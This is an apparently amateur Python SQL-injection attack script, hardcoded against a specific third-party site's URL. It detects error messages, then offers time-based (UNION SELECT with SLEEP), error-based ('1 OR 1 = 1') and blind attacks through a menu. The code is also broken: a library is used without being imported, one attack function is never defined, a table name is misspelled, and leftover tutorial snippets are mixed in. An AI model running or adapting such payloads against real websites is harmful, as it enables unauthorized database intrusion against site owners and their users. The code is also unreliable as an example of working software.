import urllib.request 
import urllib.error 
import requests
import sys

req = 'http://achromicpoint.com/past-event.php?id=186'
#req = input("Enter the url:")
#req = 'https://en.wikipedia.org/wiki/Phrack'

def time_based(req):
	result = requests.get(req)
	time = result.elapsed.total_seconds()
	print(time)
	resp = urllib.request.urlopen(req+ "UNION SELECT * FROM information_scheme WHERE id=186-SLEEP(15) --+")
	
'''
	if time < 2.5:
		print("Given url is vulnerable")
	else:
		print("The given url is not defined")
'''

def error_based(req):
    request = mechanize.Browser()
    request.open(req)
    request.select_form(nr=0)
    request["id"] = "1 OR 1 = 1"
    response = request.submit()
    content = response.read()
    print(content)
    '''
    resp = urllib.request.urlopen(req)
    body = resp.read()
    fullbody = body.decode('utf-8')
    if "You have error in your SQL syntax" in fullbody:
        print("Vulnerable")
    else:
        print("Not Vulnerable")
        '''

def perform(url):
	resp = urllib.request.urlopen(url+ "'")
	body = resp.read() 
	fullbody = body.decode('utf-8')
	if "You have an error in your SQL syntax" in fullbody:
		print("The given url is vulnerable")
	else:
		print("The webiste is not Vulnerable")
		sys.exit()
	print("*"*100)
	print("Type of attacks to perform")
	print("1:Time Based Attack\n2:Error Based Attack\n3:Blind Based Attack")
	attack = int(input("Choose the Type:"))
	if attack == 1 :
		time_based(req)
	elif attack == 2 :
		error_based(req)
	else :
		blind_based(req)

if __name__ == "__main__":
	try:
		response = urllib.request.urlopen(req)
		perform(req)
	except urllib.error.URLError as e:
		if hasattr(e, 'reason'):
			print('We failed to reach a server.')
			print('Reason: ', e.reason)				
		elif hasattr(e, 'code'):
			print('The server couldn\'t fulfill the request.')
			print('Error code: ', e.code)
		else:
	    		print('everything is fine')	    
    	

'''
webUrl  = urllib.request.urlopen('https://www.youtube.com/user/guru99com')

#get the result code and print it
print ("result code: " + str(webUrl.getcode()))

# read the data from the URL and print it
data = webUrl.read()
print (data)
'''
	



	
